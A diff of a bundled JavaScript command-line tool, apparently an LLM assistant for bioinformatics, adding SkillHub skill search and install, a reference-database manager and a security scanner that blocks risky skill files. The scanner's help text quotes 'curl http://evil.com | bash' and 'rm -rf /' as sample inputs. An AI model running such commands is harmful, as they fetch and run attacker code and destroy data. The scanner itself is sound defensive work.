+  console.log(`  ${source_default.cyan("/db scan")} [\u76EE\u5F55]     \u81EA\u52A8\u626B\u63CF\u6587\u4EF6\u7CFB\u7EDF\u67E5\u627E\u5DF2\u77E5\u6570\u636E\u5E93`);
+  console.log(`  ${source_default.cyan("/db rm")} <id>         \u5220\u9664\u6570\u636E\u5E93\u8BB0\u5F55`);
+  console.log(`  ${source_default.cyan("/db download")} [\u540D\u79F0] \u663E\u793A\u6807\u51C6\u6570\u636E\u5E93\u4E0B\u8F7D\u547D\u4EE4`);
+  console.log();
+  console.log(source_default.bold.cyan("\u2500\u2500\u2500 \u5B89\u5168\u626B\u63CF \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500"));
+  console.log(`  ${source_default.cyan("/scan")} <\u547D\u4EE4>        \u626B\u63CF\u547D\u4EE4\u5B89\u5168\u98CE\u9669 ${source_default.dim("[CRITICAL/HIGH/MEDIUM/LOW]")}`);
   console.log();
   console.log(source_default.bold.cyan("\u2500\u2500\u2500 \u6587\u4EF6 & \u76EE\u5F55 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500"));
   console.log(`  ${source_default.cyan("/cd")} <\u8DEF\u5F84>          \u66F4\u6539\u5DE5\u4F5C\u76EE\u5F55`);
@@ -15661,16 +16347,17 @@ async function firstRunIfNeeded(rl) {
 function collectAllSkills() {
   const entries = [];
   const addFrom = (dir, tag) => {
-    if (!(0, import_fs5.existsSync)(dir)) return;
-    (0, import_fs5.readdirSync)(dir).forEach((f2) => {
+    if (!(0, import_fs6.existsSync)(dir)) return;
+    (0, import_fs6.readdirSync)(dir).forEach((f2) => {
       try {
-        if ((0, import_fs5.statSync)((0, import_path5.join)(dir, f2)).isDirectory()) entries.push({ id: f2, dir, tag });
+        if ((0, import_fs6.statSync)((0, import_path6.join)(dir, f2)).isDirectory()) entries.push({ id: f2, dir, tag });
       } catch {
       }
     });
   };
   addFrom(SKILLS_DIR, "skill");
   addFrom(WORKFLOWS_DIR, "skill");
+  addFrom(USER_SKILLS_DIR, "user");
   return entries;
 }
 function listSkills(keyword) {
@@ -15704,9 +16391,9 @@ async function llmRecommendSkills(userQuery) {
   const all = collectAllSkills();
   const catalogLines = [];
   for (const entry of all) {
-    const skillPath = (0, import_path5.join)(entry.dir, entry.id, "SKILL.md");
-    if (!(0, import_fs5.existsSync)(skillPath)) continue;
-    const raw = (0, import_fs5.readFileSync)(skillPath, "utf8");
+    const skillPath = (0, import_path6.join)(entry.dir, entry.id, "SKILL.md");
+    if (!(0, import_fs6.existsSync)(skillPath)) continue;
+    const raw = (0, import_fs6.readFileSync)(skillPath, "utf8");
     const { name, shortDesc } = parseSkillMeta(raw);
     const displayName = name || entry.id;
     const desc = shortDesc ? ` \u2014 ${shortDesc}` : "";
@@ -15765,12 +16452,12 @@ async function injectSkill(id, history, injectedSkills, rl, skipConfirm = false)
     console.log(source_default.dim("\u4F7F\u7528 /sk <\u5173\u952E\u8BCD> \u641C\u7D22"));
     return false;
   }
-  const skillPath = (0, import_path5.join)(match.dir, match.id, "SKILL.md");
-  if (!(0, import_fs5.existsSync)(skillPath)) {
+  const skillPath = (0, import_path6.join)(match.dir, match.id, "SKILL.md");
+  if (!(0, import_fs6.existsSync)(skillPath)) {
     console.log(source_default.red(`${match.id} \u7F3A\u5C11 SKILL.md`));
     return false;
   }
-  const content = (0, import_fs5.readFileSync)(skillPath, "utf8");
+  const content = (0, import_fs6.readFileSync)(skillPath, "utf8");
   const { name, shortDesc } = parseSkillMeta(content);
   const displayName = name || match.id;
   if (!skipConfirm) {
@@ -15820,9 +16507,9 @@ var FILE_SIZE_LIMIT = 100 * 1024;
 var DIR_FILE_LIMIT = 20;
 function listDirFiles(dirPath) {
   try {
-    return (0, import_fs6.readdirSync)(dirPath).map((f2) => (0, import_path5.join)(dirPath, f2)).filter((p2) => {
+    return (0, import_fs7.readdirSync)(dirPath).map((f2) => (0, import_path6.join)(dirPath, f2)).filter((p2) => {
       try {
-        return (0, import_fs6.statSync)(p2).isFile();
+        return (0, import_fs7.statSync)(p2).isFile();
       } catch {
         return false;
       }
@@ -15833,7 +16520,7 @@ function listDirFiles(dirPath) {
 }
 function expandSingleFile(resolved) {
   try {
-    const stat = (0, import_fs6.statSync)(resolved);
+    const stat = (0, import_fs7.statSync)(resolved);
     if (!stat.isFile()) return `[${resolved}: \u4E0D\u662F\u6587\u4EF6]`;
     if (stat.size > FILE_SIZE_LIMIT) {
       return `
@@ -15843,7 +16530,7 @@ function expandSingleFile(resolved) {
 \`\`\`
 `;
     }
-    const content = (0, import_fs5.readFileSync)(resolved, "utf8");
+    const content = (0, import_fs6.readFileSync)(resolved, "utf8");
     const lines = content.split("\n");
     const preview = lines.length > 150 ? lines.slice(0, 150).join("\n") + `
 ... (\u5171 ${lines.length} \u884C\uFF0C\u5DF2\u622A\u65AD)` : content;
@@ -15860,10 +16547,10 @@ ${preview}
 function expandFileRefs(input) {
   return input.replace(/@"([^"]+)"|@'([^']+)'|@([\/\w.*?~:-]+)/g, (match, q1, q2, q3) => {
     const rawPath = q1 ?? q2 ?? q3;
-    const expanded = rawPath.replace(/^~/, (0, import_os3.homedir)());
+    const expanded = rawPath.replace(/^~/, (0, import_os4.homedir)());
     if (rawPath.endsWith("/") || rawPath.endsWith("\\")) {
-      const dirResolved = (0, import_path5.resolve)(expanded);
-      if (!(0, import_fs5.existsSync)(dirResolved)) return match;
+      const dirResolved = (0, import_path6.resolve)(expanded);
+      if (!(0, import_fs6.existsSync)(dirResolved)) return match;
       const files = listDirFiles(dirResolved).slice(0, DIR_FILE_LIMIT);
       if (files.length === 0) return `[\u76EE\u5F55 ${dirResolved} \u4E3A\u7A7A]`;
       const parts = [`
@@ -15892,8 +16579,8 @@ function expandFileRefs(input) {
       for (const f2 of matched) parts.push(expandSingleFile(f2));
       return parts.join("\n");
     }
-    const resolved = (0, import_path5.resolve)(expanded);
-    if (!(0, import_fs5.existsSync)(resolved)) return match;
+    const resolved = (0, import_path6.resolve)(expanded);
+    if (!(0, import_fs6.existsSync)(resolved)) return match;
     return expandSingleFile(resolved);
   });
 }
@@ -15902,11 +16589,11 @@ function snapshotWorkdir(dir) {
   function walk(d2, depth = 0) {
     if (depth > 3) return;
     try {
-      for (const entry of (0, import_fs5.readdirSync)(d2)) {
+      for (const entry of (0, import_fs6.readdirSync)(d2)) {
         if (entry.startsWith(".") || entry === "node_modules") continue;
-        const full = (0, import_path5.join)(d2, entry);
+        const full = (0, import_path6.join)(d2, entry);
         try {
-          const st2 = (0, import_fs5.statSync)(full);
+          const st2 = (0, import_fs6.statSync)(full);
           if (st2.isDirectory()) {
             walk(full, depth + 1);
           } else {
@@ -15941,7 +16628,7 @@ function saveConversation(history, filename) {
   }
   const now = /* @__PURE__ */ new Date();
   const stamp = now.toISOString().slice(0, 16).replace("T", "-").replace(":", "-");
-  const outPath = (0, import_path5.resolve)(filename || `bgicli-chat-${stamp}.md`);
+  const outPath = (0, import_path6.resolve)(filename || `bgicli-chat-${stamp}.md`);
   const lines = [`# BGI CLI \u5BF9\u8BDD\u8BB0\u5F55
 `, `> \u5BFC\u51FA\u65F6\u95F4: ${now.toLocaleString("zh-CN")}
 `];
@@ -15960,7 +16647,7 @@ ${msg.content}
 `);
     }
   }
-  (0, import_fs5.writeFileSync)(outPath, lines.join("\n"), "utf8");
+  (0, import_fs6.writeFileSync)(outPath, lines.join("\n"), "utf8");
   console.log(source_default.green(`\u2713 \u5BF9\u8BDD\u5DF2\u4FDD\u5B58: ${outPath}`));
 }
 var COMPACT_TOKEN_THRESHOLD = 4e4;
@@ -16303,12 +16990,12 @@ async function handleCommand(input, rl, history, thinkMode, injectedSkills) {
         console.log(source_default.red(`\u672A\u627E\u5230 Skill: ${targetId}`));
         break;
       }
-      const skillPath = (0, import_path5.join)(runMatch.dir, runMatch.id, "SKILL.md");
-      if (!(0, import_fs5.existsSync)(skillPath)) {
+      const skillPath = (0, import_path6.join)(runMatch.dir, runMatch.id, "SKILL.md");
+      if (!(0, import_fs6.existsSync)(skillPath)) {
         console.log(source_default.red(`${runMatch.id} \u7F3A\u5C11 SKILL.md`));
         break;
       }
-      const skillContent = (0, import_fs5.readFileSync)(skillPath, "utf8");
+      const skillContent = (0, import_fs6.readFileSync)(skillPath, "utf8");
       const { name: skillName } = parseSkillMeta(skillContent);
       const paramsMatch = skillContent.match(/##\s*(?:必要参数|Required Parameters|参数)[\s\S]*?(?=\n##|$)/i);
       const paramsSection = paramsMatch?.[0] ?? "";
@@ -16346,7 +17033,7 @@ ${paramSummary}
       console.log(source_default.dim("\n  \u6B63\u5728\u751F\u6210\u5E76\u6267\u884C\u5206\u6790\u811A\u672C...\n"));
       try {
         const runCfg = loadConfig();
-        const reply = await chat(history, runCfg, buildSystemPrompt());
+        const reply = await chat(history, runCfg, systemPrompt);
         history.push({ role: "assistant", content: reply });
       } catch (err) {
         console.error(source_default.red(`\u6267\u884C\u5931\u8D25: ${err instanceof Error ? err.message : String(err)}`));
@@ -16367,9 +17054,9 @@ ${paramSummary}
         break;
       }
       for (const entry of skillsToCheck) {
-        const sp = (0, import_path5.join)(entry.dir, entry.id, "SKILL.md");
-        if (!(0, import_fs5.existsSync)(sp)) continue;
-        const content = (0, import_fs5.readFileSync)(sp, "utf8");
+        const sp = (0, import_path6.join)(entry.dir, entry.id, "SKILL.md");
+        if (!(0, import_fs6.existsSync)(sp)) continue;
+        const content = (0, import_fs6.readFileSync)(sp, "utf8");
         const { name } = parseSkillMeta(content);
         console.log(source_default.bold(`
 \u68C0\u6D4B ${name || entry.id} \u7684\u4F9D\u8D56\u73AF\u5883:`));
@@ -16421,21 +17108,124 @@ ${paramSummary}
       }
       break;
     }
-    // ── /install from GitHub ─────────────────────────────────────────────────
-    case "install": {
+    // ── /search SkillHub ─────────────────────────────────────────────────────
+    case "search": {
       if (!arg) {
-        console.log("\u7528\u6CD5: /install <github-url>");
-        console.log(source_default.dim("\u793A\u4F8B: /install https://github.com/user/my-skill"));
-        console.log(source_default.dim("      /install user/repo  (GitHub \u7B80\u5199)"));
+        console.log("\u7528\u6CD5: /search <\u5173\u952E\u8BCD> [--hub=bgi|clawhub|tencent]");
+        console.log(source_default.dim("\u793A\u4F8B: /search rnaseq"));
+        console.log(source_default.dim("      /search \u86CB\u767D\u8D28\u7ED3\u6784\u9884\u6D4B --hub=tencent"));
+        console.log(source_default.dim("      /search genomics --hub=clawhub"));
+        console.log(source_default.dim("\n\u9ED8\u8BA4\u641C\u7D22 BGI \u5185\u7F51 SkillHub (http://172.16.218.40:8080)"));
         break;
       }
-      let repoUrl = arg;
+      let hubKey = "bgi";
+      const hubMatch = arg.match(/--hub=(\w+)/);
+      const query = arg.replace(/--hub=\w+/g, "").trim();
+      if (hubMatch) {
+        const hk = hubMatch[1];
+        if (hk in SKILLHUB_HUBS) hubKey = hk;
+        else {
+          console.log(source_default.red(`\u672A\u77E5 hub: ${hubMatch[1]}\uFF0C\u53EF\u9009: bgi, clawhub, tencent`));
+          break;
+        }
+      }
+      if (!query) {
+        console.log(source_default.yellow("\u8BF7\u63D0\u4F9B\u641C\u7D22\u5173\u952E\u8BCD"));
+        break;
+      }
+      const hubLabel = SKILLHUB_HUBS[hubKey].label;
+      process.stdout.write(source_default.dim(`\u6B63\u5728\u641C\u7D22 ${hubLabel} SkillHub: "${query}"...
+`));
+      try {
+        const results = await searchSkillHub(query, hubKey, 10);
+        if (results.length === 0) {
+          console.log(source_default.yellow(`  \u672A\u627E\u5230\u76F8\u5173 Skill\uFF0C\u8BF7\u5C1D\u8BD5\u5176\u4ED6\u5173\u952E\u8BCD`));
+          break;
+        }
+        _lastSearchResults = results;
+        console.log(source_default.bold(`
+  \u641C\u7D22\u7ED3\u679C (${hubLabel}) \u2014 \u5171 ${results.length} \u4E2A:
+`));
+        results.forEach((s2, i2) => {
+          const ver = s2.version ? source_default.dim(` v${s2.version}`) : "";
+          const owner = s2.owner ? source_default.dim(` @${s2.owner}`) : "";
+          console.log(`  ${source_default.cyan(`[${i2 + 1}]`)} ${source_default.bold(s2.name)}${owner}${ver}`);
+          console.log(`      ${source_default.dim(s2.summary.substring(0, 90))}${s2.summary.length > 90 ? "\u2026" : ""}`);
+          console.log(`      ${source_default.dim(`slug: ${s2.slug}`)}`);
+          console.log();
+        });
+        console.log(source_default.dim(`\u5B89\u88C5: /install <slug>  \u6216  /install <\u5E8F\u53F7>  (\u5982: /install 1)`));
+      } catch (e2) {
+        console.log(source_default.red(`\u641C\u7D22\u5931\u8D25: ${e2 instanceof Error ? e2.message : String(e2)}`));
+      }
+      break;
+    }
+    // ── /install from GitHub or SkillHub ──────────────────────────────────────
+    case "install": {
+      if (!arg) {
+        console.log("\u7528\u6CD5: /install <github-url | slug | \u641C\u7D22\u5E8F\u53F7>");
+        console.log(source_default.dim("\u793A\u4F8B: /install https://github.com/user/my-skill"));
+        console.log(source_default.dim("      /install user/repo       (GitHub \u7B80\u5199)"));
+        console.log(source_default.dim("      /install personal-genomics (SkillHub slug)"));
+        console.log(source_default.dim("      /install 2               (\u641C\u7D22\u7ED3\u679C\u5E8F\u53F7)"));
+        break;
+      }
+      let installArg = arg;
+      const searchNum = /^\d+$/.test(installArg) ? parseInt(installArg, 10) : 0;
+      if (searchNum > 0 && _lastSearchResults.length > 0) {
+        if (searchNum > _lastSearchResults.length) {
+          console.log(source_default.red(`\u5E8F\u53F7 ${searchNum} \u8D85\u51FA\u8303\u56F4\uFF08\u5171 ${_lastSearchResults.length} \u4E2A\u7ED3\u679C\uFF09`));
+          break;
+        }
+        const picked = _lastSearchResults[searchNum - 1];
+        console.log(source_default.dim(`\u4ECE\u641C\u7D22\u7ED3\u679C\u5B89\u88C5: ${picked.name} (${picked.slug})`));
+        installArg = picked.slug;
+      }
+      const isGitHub = installArg.includes("github.com") || installArg.includes("gitlab") || installArg.includes("bitbucket") || /^[^/]+\/[^/]+$/.test(installArg);
+      if (!isGitHub && !installArg.startsWith("http")) {
+        const slug = installArg.trim();
+        const installTarget2 = (0, import_path6.join)(USER_SKILLS_DIR, slug);
+        if ((0, import_fs6.existsSync)(installTarget2)) {
+          console.log(source_default.yellow(`Skill "${slug}" \u5DF2\u5B58\u5728\uFF0C\u5982\u9700\u66F4\u65B0\u8BF7\u5148 /uninstall ${slug}`));
+          break;
+        }
+        process.stdout.write(source_default.dim(`\u6B63\u5728\u4ECE SkillHub \u4E0B\u8F7D Skill: ${slug}...
+`));
+        try {
+          const skillMdContent = await downloadSkillMd(slug);
+          const skillScan = scanSkillMd(skillMdContent);
+          if (skillScan.criticalCount > 0) {
+            console.log(source_default.red(`
+\u26D4 \u5B89\u5168\u626B\u63CF\u53D1\u73B0 ${skillScan.criticalCount} \u4E2A CRITICAL \u98CE\u9669\uFF0C\u5DF2\u62D2\u7EDD\u5B89\u88C5`));
+            console.log(source_default.dim(`   \u4F7F\u7528 /scan \u547D\u4EE4\u68C0\u67E5\u5177\u4F53\u5185\u5BB9`));
+            break;
+          }
+          (0, import_fs6.mkdirSync)(installTarget2, { recursive: true });
+          (0, import_fs6.writeFileSync)((0, import_path6.join)(installTarget2, "SKILL.md"), skillMdContent, "utf8");
+          const { name: name2, shortDesc: shortDesc2 } = parseSkillMeta(skillMdContent);
+          console.log(source_default.green(`\u2713 SkillHub Skill \u5B89\u88C5\u6210\u529F!`));
+          console.log(`  ID:    ${source_default.cyan(slug)}`);
+          console.log(`  \u540D\u79F0:  ${name2 || slug}`);
+          if (shortDesc2) console.log(`  \u529F\u80FD:  ${source_default.dim(shortDesc2)}`);
+          if (skillScan.highCount > 0) console.log(source_default.yellow(`  \u26A0 \u5305\u542B ${skillScan.highCount} \u4E2A HIGH \u98CE\u9669\u547D\u4EE4\uFF0C\u8BF7\u786E\u8BA4\u6765\u6E90\u53EF\u4FE1`));
+          console.log(source_default.dim(`  \u4F7F\u7528 /sk ${slug} \u52A0\u8F7D`));
+        } catch (e2) {
+          const msg = e2 instanceof Error ? e2.message : String(e2);
+          if (msg === "not_found") {
+            console.log(source_default.red(`SkillHub \u672A\u627E\u5230 "${slug}"\uFF0C\u8BF7\u5148\u7528 /search \u641C\u7D22\u786E\u8BA4 slug`));
+          } else {
+            console.log(source_default.red(`\u4E0B\u8F7D\u5931\u8D25: ${msg}`));
+          }
+        }
+        break;
+      }
+      let repoUrl = installArg;
       if (!repoUrl.startsWith("http")) {
         repoUrl = `https://github.com/${repoUrl}`;
       }
       const repoName = repoUrl.replace(/\.git$/, "").split("/").pop() ?? "unknown-skill";
-      const installTarget = (0, import_path5.join)(SKILLS_DIR, repoName);
-      if ((0, import_fs5.existsSync)(installTarget)) {
+      const installTarget = (0, import_path6.join)(USER_SKILLS_DIR, repoName);
+      if ((0, import_fs6.existsSync)(installTarget)) {
         console.log(source_default.yellow(`Skill "${repoName}" \u5DF2\u5B58\u5728\uFF0C\u5982\u9700\u66F4\u65B0\u8BF7\u5148 /uninstall ${repoName}`));
         break;
       }
@@ -16447,13 +17237,13 @@ ${paramSummary}
         console.log(source_default.red(`\u5B89\u88C5\u5931\u8D25: ${cloneResult.output || cloneResult.error}`));
         break;
       }
-      const skillMdPath = (0, import_path5.join)(installTarget, "SKILL.md");
-      if (!(0, import_fs5.existsSync)(skillMdPath)) {
+      const skillMdPath = (0, import_path6.join)(installTarget, "SKILL.md");
+      if (!(0, import_fs6.existsSync)(skillMdPath)) {
         console.log(source_default.red(`\u5B89\u88C5\u5931\u8D25: ${repoName} \u7F3A\u5C11 SKILL.md \u6587\u4EF6`));
         await executeTool("bash", { command: `rm -rf "${installTarget}"` });
         break;
       }
-      const content = (0, import_fs5.readFileSync)(skillMdPath, "utf8");
+      const content = (0, import_fs6.readFileSync)(skillMdPath, "utf8");
       const { name, shortDesc } = parseSkillMeta(content);
       console.log(source_default.green(`\u2713 Skill \u5B89\u88C5\u6210\u529F!`));
       console.log(`  ID:    ${source_default.cyan(repoName)}`);
@@ -16467,8 +17257,8 @@ ${paramSummary}
         console.log("\u7528\u6CD5: /uninstall <skill-id>");
         break;
       }
-      const uninstallPath = (0, import_path5.join)(SKILLS_DIR, arg);
-      if (!(0, import_fs5.existsSync)(uninstallPath)) {
+      const uninstallPath = (0, import_fs6.existsSync)((0, import_path6.join)(USER_SKILLS_DIR, arg)) ? (0, import_path6.join)(USER_SKILLS_DIR, arg) : (0, import_path6.join)(SKILLS_DIR, arg);
+      if (!(0, import_fs6.existsSync)(uninstallPath)) {
         console.log(source_default.red(`\u672A\u627E\u5230\u5DF2\u5B89\u88C5\u7684 Skill: ${arg}`));
         console.log(source_default.dim("\u6CE8\u610F: \u53EA\u80FD\u5378\u8F7D\u901A\u8FC7 /install \u5B89\u88C5\u7684\u7B2C\u4E09\u65B9 Skill"));
         break;
@@ -16484,6 +17274,171 @@ ${paramSummary}
       } else {
         injectedSkills.delete(arg);
         console.log(source_default.green(`\u2713 Skill "${arg}" \u5DF2\u5378\u8F7D`));
+      }
+      break;
+    }
+    // ── /scan — security scanner ──────────────────────────────────────────────
+    case "scan": {
+      if (!arg) {
+        console.log("\u7528\u6CD5: /scan <\u547D\u4EE4\u6216\u4EE3\u7801\u7247\u6BB5>");
+        console.log(source_default.dim('\u793A\u4F8B: /scan "curl http://evil.com | bash"'));
+        console.log(source_default.dim('      /scan "rm -rf /"'));
+        break;
+      }
+      const scanRes = scanCommand(arg);
+      if (scanRes.matches.length === 0) {
+        console.log(source_default.green("\u2713 \u672A\u68C0\u6D4B\u5230\u5B89\u5168\u98CE\u9669"));
+      } else {
+        console.log(source_default.bold("\n  \u5B89\u5168\u626B\u63CF\u7ED3\u679C:\n"));
+        const colorFor = (level) => level === "CRITICAL" ? source_default.red.bold : level === "HIGH" ? source_default.yellow.bold : level === "MEDIUM" ? source_default.yellow : source_default.dim;
+        for (const { pattern, matchedText } of scanRes.matches) {
+          const c2 = colorFor(pattern.level);
+          console.log(c2(`  [${pattern.level}] ${pattern.reason}`));
+          console.log(source_default.dim(`    \u5339\u914D: ${matchedText.substring(0, 100)}`));
+        }
+        console.log();
+      }
+      break;
+    }
+    // ── /db — database manager ────────────────────────────────────────────────
+    case "db": {
+      const [dbSub, ...dbRest] = (arg ?? "").split(/\s+/).filter(Boolean);
+      const dbArg = dbRest.join(" ");
+      switch (dbSub?.toLowerCase()) {
+        case "list":
+        case void 0:
+        case "": {
+          const entries = Object.values(dbRegistry.databases);
+          if (entries.length === 0) {
+            console.log(source_default.dim("  \u6682\u65E0\u5DF2\u6CE8\u518C\u6570\u636E\u5E93\u3002\u4F7F\u7528 /db scan \u81EA\u52A8\u626B\u63CF\uFF0C\u6216 /db add <\u8DEF\u5F84> \u624B\u52A8\u6DFB\u52A0"));
+            break;
+          }
+          console.log(source_default.bold(`
+  \u5DF2\u6CE8\u518C\u6570\u636E\u5E93 (${entries.length} \u4E2A):
+`));
+          const byGenome = {};
+          for (const e2 of entries) (byGenome[e2.genome] ??= []).push(e2);
+          for (const [genome, dbs] of Object.entries(byGenome).sort()) {
+            console.log(source_default.cyan(`  \u2500\u2500 ${genome} \u2500\u2500`));
+            for (const db of dbs) {
+              const ok = (0, import_fs6.existsSync)(db.path);
+              const icon = ok ? source_default.green("\u2713") : source_default.red("\u2717");
+              const size = db.sizeBytes ? source_default.dim(` [${(db.sizeBytes / 1e9).toFixed(1)}GB]`) : "";
+              console.log(`  ${icon} ${source_default.bold(db.label)}${size}`);
+              console.log(`    ${source_default.dim("id:")} ${db.id}  ${source_default.dim("type:")} ${db.type}`);
+              console.log(`    ${source_default.dim(db.path)}`);
+            }
+            console.log();
+          }
+          break;
+        }
+        case "add": {
+          if (!dbArg) {
+            console.log("\u7528\u6CD5: /db add <\u8DEF\u5F84> [\u57FA\u56E0\u7EC4] [\u7C7B\u578B] [\u8BF4\u660E]");
+            console.log(source_default.dim("\u793A\u4F8B: /db add /data/ref/hg38.fa hg38 fasta"));
+            console.log(source_default.dim("      /db add /data/index/hg38_star hg38 star_index STAR\u6BD4\u5BF9\u7D22\u5F15"));
+            break;
+          }
+          const parts = dbArg.trim().split(/\s+/);
+          const dbPath = (0, import_path6.resolve)(parts[0]);
+          if (!(0, import_fs6.existsSync)(dbPath)) {
+            console.log(source_default.yellow(`\u26A0 \u8DEF\u5F84\u4E0D\u5B58\u5728: ${dbPath}\uFF08\u4ECD\u4F1A\u8BB0\u5F55\uFF0C\u8DEF\u5F84\u53EF\u7A0D\u540E\u521B\u5EFA\uFF09`));
+          }
+          const genome = parts[1] ?? "other";
+          const type = parts[2] ?? "other";
+          const label = parts.slice(3).join(" ") || `${type} (${genome})`;
+          const entry = addDbEntry(dbRegistry, { label, type, genome, path: dbPath, source: "manual" });
+          saveDbRegistry(dbRegistry);
+          systemPrompt = buildSystemPrompt(buildDbPromptSection(dbRegistry));
+          console.log(source_default.green(`\u2713 \u5DF2\u6DFB\u52A0\u6570\u636E\u5E93: ${entry.label}`));
+          console.log(`  id: ${source_default.cyan(entry.id)}`);
+          console.log(`  \u8DEF\u5F84: ${source_default.dim(entry.path)}`);
+          break;
+        }
+        case "rm":
+        case "remove":
+        case "del": {
+          if (!dbArg) {
+            console.log("\u7528\u6CD5: /db rm <id>");
+            break;
+          }
+          const removed = removeDbEntry(dbRegistry, dbArg.trim());
+          if (removed) {
+            saveDbRegistry(dbRegistry);
+            systemPrompt = buildSystemPrompt(buildDbPromptSection(dbRegistry));
+            console.log(source_default.green(`\u2713 \u5DF2\u79FB\u9664\u6570\u636E\u5E93: ${dbArg}`));
+          } else {
+            console.log(source_default.red(`\u672A\u627E\u5230\u6570\u636E\u5E93 id: ${dbArg}\uFF0C\u4F7F\u7528 /db list \u67E5\u770B\u5DF2\u6CE8\u518C\u5217\u8868`));
+          }
+          break;
+        }
+        case "scan": {
+          const extraDirs = dbArg ? [dbArg] : [];
+          process.stdout.write(source_default.dim("\n  \u6B63\u5728\u626B\u63CF\u6587\u4EF6\u7CFB\u7EDF\u4E2D\u7684\u53C2\u8003\u6570\u636E\u5E93...\n"));
+          const report = scanForDatabases(extraDirs);
+          if (report.found.length === 0) {
+            console.log(source_default.yellow("  \u672A\u627E\u5230\u4EFB\u4F55\u5DF2\u77E5\u6570\u636E\u5E93\u6587\u4EF6"));
+            console.log(source_default.dim("  \u63D0\u793A: \u53EF\u6307\u5B9A\u76EE\u5F55 /db scan /your/data/dir"));
+            break;
+          }
+          console.log(source_default.bold(`
+  \u626B\u63CF\u53D1\u73B0 ${report.found.length} \u4E2A\u6570\u636E\u5E93\u6587\u4EF6:
+`));
+          let addedCount = 0;
+          for (const entry of report.found) {
+            const exists = dbRegistry.databases[entry.id];
+            if (exists) {
+              console.log(source_default.dim(`  [\u5DF2\u5B58\u5728] ${entry.label}`));
+              continue;
+            }
+            dbRegistry.databases[entry.id] = entry;
+            addedCount++;
+            const size = entry.sizeBytes ? source_default.dim(` [${(entry.sizeBytes / 1e9).toFixed(1)}GB]`) : "";
+            console.log(source_default.green(`  [\u65B0\u589E] `) + `${entry.label}${size}`);
+            console.log(source_default.dim(`         ${entry.path}`));
+          }
+          if (addedCount > 0) {
+            dbRegistry.lastScan = (/* @__PURE__ */ new Date()).toISOString();
+            saveDbRegistry(dbRegistry);
+            systemPrompt = buildSystemPrompt(buildDbPromptSection(dbRegistry));
+            console.log(source_default.green(`
+  \u2713 \u65B0\u589E ${addedCount} \u4E2A\u6570\u636E\u5E93\u5230\u6CE8\u518C\u8868`));
+          } else {
+            console.log(source_default.dim("\n  \u65E0\u65B0\u589E\uFF08\u6240\u6709\u5DF2\u5728\u6CE8\u518C\u8868\u4E2D\uFF09"));
+          }
+          break;
+        }
+        case "download":
+        case "dl": {
+          const target = dbArg.trim() || "";
+          if (!target) {
+            console.log(source_default.bold("\n  \u53EF\u4E0B\u8F7D\u7684\u6807\u51C6\u6570\u636E\u5E93:\n"));
+            for (const [key, guide2] of Object.entries(DOWNLOAD_GUIDES)) {
+              console.log(`  ${source_default.cyan(key.padEnd(18))} ${guide2.label}`);
+            }
+            console.log(source_default.dim("\n  \u7528\u6CD5: /db download hg38-fasta"));
+            break;
+          }
+          const guide = DOWNLOAD_GUIDES[target];
+          if (!guide) {
+            console.log(source_default.red(`\u672A\u77E5\u6570\u636E\u5E93: ${target}`));
+            console.log(source_default.dim("\u4F7F\u7528 /db download \u67E5\u770B\u53EF\u7528\u5217\u8868"));
+            break;
+          }
+          console.log(source_default.bold(`
+  \u4E0B\u8F7D\u6307\u5357: ${guide.label}
+`));
+          guide.cmds.forEach((cmd2) => console.log(`  ${source_default.cyan("$")} ${cmd2}`));
+          console.log(source_default.dim("\n  \u4E0B\u8F7D\u5B8C\u6210\u540E\u4F7F\u7528 /db add <\u8DEF\u5F84> \u6CE8\u518C"));
+          break;
+        }
+        default:
+          console.log(`\u7528\u6CD5: /db <list|add|rm|scan|download>`);
+          console.log(source_default.dim("  /db list              \u5217\u51FA\u5DF2\u6CE8\u518C\u6570\u636E\u5E93"));
+          console.log(source_default.dim("  /db add <\u8DEF\u5F84>        \u624B\u52A8\u6CE8\u518C"));
+          console.log(source_default.dim("  /db rm <id>           \u5220\u9664\u8BB0\u5F55"));
+          console.log(source_default.dim("  /db scan [\u76EE\u5F55]       \u81EA\u52A8\u626B\u63CF"));
+          console.log(source_default.dim("  /db download [\u540D\u79F0]   \u663E\u793A\u4E0B\u8F7D\u6307\u5357"));
       }
       break;
     }
@@ -16658,8 +17613,8 @@ ${summary}` },
         console.log("\u7528\u6CD5: /cd <\u8DEF\u5F84>");
         break;
       }
-      const target = (0, import_path5.resolve)(arg.replace(/^~/, (0, import_os3.homedir)()));
-      if (!(0, import_fs5.existsSync)(target)) {
+      const target = (0, import_path6.resolve)(arg.replace(/^~/, (0, import_os4.homedir)()));
+      if (!(0, import_fs6.existsSync)(target)) {
         console.log(source_default.red(`\u8DEF\u5F84\u4E0D\u5B58\u5728: ${target}`));
         break;
       }
@@ -16692,26 +17647,29 @@ ${summary}` },
 async function main() {
   installBundledData();
   printBanner();
-  await checkAndAutoUpdate();
+  await checkAndAutoUpdate().catch(() => {
+  });
   const rl = (0, import_readline.createInterface)({
     input: process.stdin,
     output: process.stdout,
     terminal: true,
     historySize: 100
   });
+  let sigintHandling = false;
   rl.on("close", () => {
-    console.log(source_default.dim("\n\u518D\u89C1\uFF01"));
-    process.exit(0);
+    if (!sigintHandling && !exiting) process.exit(0);
   });
-  process.on("SIGINT", () => rl.close());
   await firstRunIfNeeded(rl);
   const cfg = loadConfig();
   const prov = PROVIDERS[cfg.provider];
-  const totalSkills = collectAllSkills().length;
+  const allSkillsList = collectAllSkills();
+  const totalSkills = allSkillsList.length;
+  const userSkillCount = allSkillsList.filter((e2) => e2.tag === "user").length;
+  const skillsLabel = totalSkills > 0 ? source_default.green(`${totalSkills} \u4E2A`) + (userSkillCount > 0 ? source_default.dim(` (\u542B ${userSkillCount} \u4E2A\u7528\u6237\u5B89\u88C5)`) : "") : source_default.yellow("\u672A\u5B89\u88C5");
